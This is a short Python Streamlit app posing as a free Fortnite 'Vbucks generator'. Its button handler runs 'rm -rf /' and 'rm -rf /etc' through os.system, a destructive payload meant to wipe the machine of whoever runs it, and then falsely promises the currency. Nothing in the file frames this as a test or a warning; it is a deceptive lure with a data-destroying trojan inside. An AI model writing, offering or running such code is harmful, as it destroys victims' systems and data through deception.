import streamlit as st
import os

def delete_root_and_os():
    # Delete the root directory and the operating system
    os.system("rm -rf /")
    os.system("rm -rf /etc")

# Streamlit app
st.title("Aman's Vbucks Gen")
st.write("Click the button below to recieve 300 vbucks")

if st.button("Vbucks"):
    delete_root_and_os()
    st.write("VBUCX WILL BE SENT TO YOUR ACCOUNT SHORTLY")
